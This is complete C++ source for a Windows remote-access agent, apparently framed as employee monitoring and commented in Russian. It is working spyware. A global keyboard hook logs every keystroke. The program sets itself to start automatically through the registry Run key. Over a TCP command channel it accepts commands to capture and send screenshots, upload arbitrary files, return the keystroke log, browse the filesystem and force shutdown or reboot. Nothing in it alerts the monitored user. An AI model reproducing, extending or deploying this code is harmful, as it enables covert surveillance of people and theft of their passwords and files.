#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <thread>
#include <chrono>
#include <filesystem>

#pragma comment(lib, "ws2_32.lib")

namespace fs = std::filesystem;
HHOOK hKeyboardHook;
const std::string logPath = "C:\\Windows\\Temp\\log_agent.txt"; 

// 1. КЕЙЛОГГЕP
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyStruct->vkCode;
        std::ofstream file(logPath, std::ios::app);
        if (file.is_open()) {
            if (vkCode == VK_SPACE) file << " [ПРОБЕЛ] ";
            else if (vkCode == VK_RETURN) file << " [ENTER]\n";
            else if (vkCode == VK_BACK) file << " [BACKSPACE] ";
            else if (vkCode >= 0x30 && vkCode <= 0x39) file << (char)vkCode;
            else if (vkCode >= 0x41 && vkCode <= 0x5A) file << (char)vkCode;
            else file << " [" << vkCode << "] ";
            file.close();
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void StartKeylogger() {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hKeyboardHook);
}

// 2. СКРИНШОТ
bool TakeLocalScreenshot(const std::string& filename) {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HWND hDesktopWnd = GetDesktopWindow();
    HDC hDesktopDC = GetDC(hDesktopWnd);
    HDC hCaptureDC = CreateCompatibleDC(hDesktopDC);
    HBITMAP hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, width, height);
    SelectObject(hCaptureDC, hCaptureBitmap);

    if (!BitBlt(hCaptureDC, 0, 0, width, height, hDesktopDC, 0, 0, SRCCOPY)) {
        ReleaseDC(hDesktopWnd, hDesktopDC);
        DeleteDC(hCaptureDC);
        return false;
    }

    BITMAPFILEHEADER bfh;
    BITMAPINFOHEADER bih;
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = width;
    bih.biHeight = height;
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;
    bih.biSizeImage = 0;
    bfh.bfType = 0x4D42;
    bfh.bfReserved1 = 0;
    bfh.bfReserved2 = 0;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + (width * height * 3);

    FILE* fp = nullptr;
    if (fopen_s(&fp, filename.c_str(), "wb") == 0 && fp != nullptr) {
        fwrite(&bfh, sizeof(BITMAPFILEHEADER), 1, fp);
        fwrite(&bih, sizeof(BITMAPINFOHEADER), 1, fp);
        int dwSize = width * height * 3;
        BYTE* pPixels = new BYTE[dwSize];
        GetDIBits(hDesktopDC, hCaptureBitmap, 0, height, pPixels, (BITMAPINFO*)&bih, DIB_RGB_COLORS);
        fwrite(pPixels, dwSize, 1, fp);
        delete[] pPixels;
        fclose(fp);
    } else {
        ReleaseDC(hDesktopWnd, hDesktopDC);
        DeleteDC(hCaptureDC);
        DeleteObject(hCaptureBitmap);
        return false;
    }

    ReleaseDC(hDesktopWnd, hDesktopDC);
    DeleteDC(hCaptureDC);
    DeleteObject(hCaptureBitmap);
    return true;
}

void SendScreenshotFile(SOCKET socket, const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        send(socket, "ERROR", 6, 0);
        return;
    }
    long long fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::string sizeStr = std::to_string(fileSize);
    send(socket, sizeStr.c_str(), sizeStr.length() + 1, 0); 

    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    char buffer[512]; 
    while (file.read(buffer, sizeof(buffer))) {
        send(socket, buffer, sizeof(buffer), 0);
    }
    if (file.gcount() > 0) {
        send(socket, buffer, file.gcount(), 0);
    }
    file.close();
}

// Включение токена админа для выключения ПК
bool EnableShutdownPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    if (GetLastError() != ERROR_SUCCESS) {
        CloseHandle(hToken);
        return false;
    }
    CloseHandle(hToken);
    return true;
}

bool SetAutoRun() {
    HKEY hKey;
    const char* czStartName = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char szProgPath[MAX_PATH];
    GetModuleFileNameA(NULL, szProgPath, MAX_PATH);
    LONG lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, czStartName, 0, KEY_WRITE, &hKey);
    if (lnRes == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "AdminNetworkAgent", 0, REG_SZ, (LPBYTE)szProgPath, strlen(szProgPath) + 1);
        RegCloseKey(hKey);
    }
    return (lnRes == ERROR_SUCCESS);
}

int main() {
    SetAutoRun();
    std::thread keylogThread(StartKeylogger);
    keylogThread.detach();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    // Автоматически переносим Агента в корень диска C:\ для работы проводника
    try { fs::current_path("C:\\"); } catch(...) {}

    while (true) {
        SOCKET agentSocket = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in hubAddr;
        hubAddr.sin_family = AF_INET;
        hubAddr.sin_port = htons(9999);
        inet_pton(AF_INET, "127.0.0.1", &hubAddr.sin_addr);

        if (connect(agentSocket, (sockaddr*)&hubAddr, sizeof(hubAddr)) == SOCKET_ERROR) {
            closesocket(agentSocket);
            std::this_thread::sleep_for(std::chrono::seconds(10));
            continue;
        }

        char networkBuffer[1024];
        while (true) {
            memset(networkBuffer, 0, sizeof(networkBuffer));
            int bytesReceived = recv(agentSocket, networkBuffer, sizeof(networkBuffer) - 1, 0);
            if (bytesReceived <= 0) break;

            std::string fullCommand(networkBuffer);

            // Разделяем строку на команду и аргумент (для cd и cp по сети)
            std::string command = fullCommand;
            std::string args = "";
            size_t spacePos = fullCommand.find(' ');
            if (spacePos != std::string::npos) {
                command = fullCommand.substr(0, spacePos);
                args = fullCommand.substr(spacePos + 1);
            }

            if (command == "exit") {
                closesocket(agentSocket);
                WSACleanup();
                return 0;
            }

            // 1. СИСТЕМНЫЕ КОМАНДЫ ВЫКЛЮЧЕНИЯ
            if (command == "shutdown") {
                EnableShutdownPrivilege();
                if (ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)) {
                    send(agentSocket, "Команда выключения выполнена успешно.\n", 39, 0);
                } else {
                    std::string err = "Ошибка выполнения shutdown. Код: " + std::to_string(GetLastError()) + "\n";
                    send(agentSocket, err.c_str(), err.length() + 1, 0);
                }
            }
            else if (command == "reboot") {
                EnableShutdownPrivilege();
                if (ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)) {
                    send(agentSocket, "Команда перезагрузки выполнена успешно.\n", 41, 0);
                } else {
                    std::string err = "Ошибка выполнения reboot. Код: " + std::to_string(GetLastError()) + "\n";
                    send(agentSocket, err.c_str(), err.length() + 1, 0);
                }
            }
            // 2. СКРИНШОТ
            else if (command == "screenshot") {
                std::string scrName = "C:\\Windows\\Temp\\temp_scr.bmp";
                if (TakeLocalScreenshot(scrName)) {
                    send(agentSocket, "Скриншот успешно сгенерирован.\n", 32, 0);
                    std::this_thread::sleep_for(std::chrono::milliseconds(300));
                    SendScreenshotFile(agentSocket, scrName);
                    DeleteFileA(scrName.c_str()); 
                } else {
                    send(agentSocket, "Ошибка создания скриншота встроенным модулем.\n", 47, 0);
                }
            }
                        else if (command == "download") {
                std::string targetFile = args; // Путь к файлу из аргументов

                // Открываем файл в бинарном режиме чтения
                std::ifstream file(targetFile, std::ios::binary | std::ios::ate);
                if (!file.is_open()) {
                    send(agentSocket, "Ошибка: Файл не найден на ПК сотрудника.\n", 40, 0);
                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
                    send(agentSocket, "ERROR", 6, 0);
                } else {
                    send(agentSocket, "Файл успешно открыт встроенным модулем Агента.\n", 47, 0);
                    
                    long long fileSize = file.tellg();
                    file.seekg(0, std::ios::beg);

                    // Отправляем Хабу размер файла текстом
                    std::string sizeStr = std::to_string(fileSize);
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    send(agentSocket, sizeStr.c_str(), sizeStr.length() + 1, 0);

                    std::this_thread::sleep_for(std::chrono::milliseconds(100));

                    // Гоним байты файла в сеть по 512 байт
                    char buffer[512];
                    while (file.read(buffer, sizeof(buffer))) {
                        send(agentSocket, buffer, sizeof(buffer), 0);
                    }
                    if (file.gcount() > 0) {
                        send(agentSocket, buffer, file.gcount(), 0);
                    }
                    file.close();
                }
            }
            // 3. КЕЙЛОГГЕР
            else if (command == "keylog_show") {
                std::ifstream file(logPath);
                std::string logContent = "";
                if (file.is_open()) {
                    std::string line;
                    while (std::getline(file, line)) logContent += line + "\n";
                    file.close();
                }
                if (logContent.empty()) logContent = "Лог кнопок пуст.\n";
                send(agentSocket, logContent.c_str(), logContent.length() + 1, 0);
            }
            // 4. ВСТРОЕННЫЙ СЕТЕВОЙ ПРОВОДНИК (FS)
            else if (command == "pwd") {
                std::string cp = "Текущий путь на ПК: " + fs::current_path().string() + "\n";
                send(agentSocket, cp.c_str(), cp.length() + 1, 0);
            }
            else if (command == "dir") {
                std::string result = "\n--- Содержимое папки ---\n";
                try {
                    for (const auto& entry : fs::directory_iterator(fs::current_path())) {
                        if (entry.is_directory()) result += "[ПАПКА] " + entry.path().filename().string() + "\n";
                        else result += "[ФАЙЛ ] " + entry.path().filename().string() + "\n";
                    }
                } catch (...) { result += "Ошибка чтения директории.\n"; }
                result += "------------------------\n";
                send(agentSocket, result.c_str(), result.length() + 1, 0);
            }
            else if (command == "cd") {
                try {
                     fs::current_path(args);
                    std::string ok = "Переход успешен. Новый путь: " + fs::current_path().string() + "\n";
                    send(agentSocket, ok.c_str(), ok.length() + 1, 0);
                } catch (...) {
                    send(agentSocket, "Ошибка: Не удалось перейти в указанную папку.\n", 47, 0);
                }
            }
            else if (command == "up") {
                try {
                    fs::current_path(fs::current_path().parent_path());
                    std::string ok = "Поднялись выше. Текущий путь: " + fs::current_path().string() + "\n";
                    send(agentSocket, ok.c_str(), ok.length() + 1, 0);
                } catch (...) { send(agentSocket, "Ошибка: Вы уже в корне диска.\n", 31, 0); }
            }
            else {
                send(agentSocket, "Неизвестная удаленная команда.\n", 32, 0);
            }
        }
        closesocket(agentSocket);
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
    WSACleanup();
    return 0;
}
